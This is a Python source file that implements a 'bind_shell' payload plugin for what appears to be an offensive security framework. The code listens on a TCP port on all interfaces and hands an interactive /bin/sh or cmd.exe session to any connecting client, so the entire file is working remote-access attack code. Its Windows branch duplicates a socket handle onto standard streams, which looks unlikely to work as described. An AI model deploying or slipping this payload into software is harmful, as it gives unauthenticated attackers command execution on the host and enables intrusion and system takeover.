import socket, subprocess, os, sys
from bxp_secretsonar.plugins.plugin_loader import PayloadPlugin
from bxp_secretsonar.core.models_v2 import PluginMeta, PluginType

class BindShell(PayloadPlugin):
    meta = PluginMeta(
        name="bind_shell",
        description="TCP bind shell (cross-platform)",
        plugin_type=PluginType.PAYLOAD
    )
    def run(self, lport, options=None):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", int(lport)))
        s.listen(1)
        conn, addr = s.accept()
        if sys.platform == "win32":
            os.dup2(conn.fileno(), 0)
            os.dup2(conn.fileno(), 1)
            os.dup2(conn.fileno(), 2)
            subprocess.call(["cmd.exe"])
        else:
            os.dup2(conn.fileno(), 0)
            os.dup2(conn.fileno(), 1)
            os.dup2(conn.fileno(), 2)
            subprocess.call(["/bin/sh", "-i"])
